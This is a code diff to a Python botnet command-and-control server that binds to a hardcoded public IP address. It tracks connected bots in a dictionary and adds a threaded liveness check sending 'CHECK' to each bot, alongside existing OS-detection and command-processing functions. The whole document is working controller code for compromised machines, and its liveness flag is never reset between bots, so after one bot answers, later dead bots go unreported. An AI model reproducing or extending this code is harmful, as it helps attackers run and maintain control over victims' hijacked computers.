@@ -7,6 +7,7 @@ import sys
 botnet = {} #Botnet dictionary
 exec_command = "null"
 on_connect_exit = False
+test_bool = False
 
 #def check_bot(addr):
 #    global botnet_address
@@ -22,20 +23,40 @@ def start_server(port=2003,ip="142.93.197.240"):
     s.listen(5)
     print("\n[*] Server Started!\n")
     while True:
-        bot,addr = s.accept()
-        botnet[str(addr[0])] = bot
-        if(botnet.get(str(addr[0]))):
-            print("[*] New bot %s"%(str(addr[0])))
+        try:
+            bot,addr = s.accept()
+            botnet[str(addr[0])] = bot
+            if(botnet.get(str(addr[0]))):
+                print("[*] New bot %s"%(str(addr[0])))
+                print(">>")
+        except socket.error:
+            pass
+
+def test_conn(bot,addr):
+    bot.send("CHECK".encode())
+    resp = bot.recv(1024).decode()
+    if(resp == "YES"):
+        print("[*] %s : Active"%(addr))
+        global test_bool
+        test_bool = True
+
+def test_bots():
+    global botnet
+    for bot in botnet:
+        bot_test_thread = Thread(target=test_conn,args=(botnet[bot],bot))
+        bot_test_thread.start()
+        sleep(5)
+        global test_bool
+        if(test_bool == False):
+            print("[*] %s : Dead"%(bot))
 
 def detect_os():
     global botnet
     #Build a dictionary of botnet addresses and sock connections
     for bot in botnet:
-        print(str(bot))
-        print(str(botnet[bot]))
         botnet[bot].send("OS".encode())
         bot_os = botnet[bot].recv(1024).decode()
-        print("Details for %s : "%(str(bot)))
+        print("\nDetails for %s : "%(str(bot)))
         print(bot_os)
         print("\n\n\n\n")
 
@@ -66,6 +87,8 @@ def process_cmd(cmd):
         detect_os()
     if 'test' in cmd:
         cmd = cmd.strip("test ")
+        t1 = Thread(target=test_bots,args=())
+        t1.start()
         pass
 
 def main():
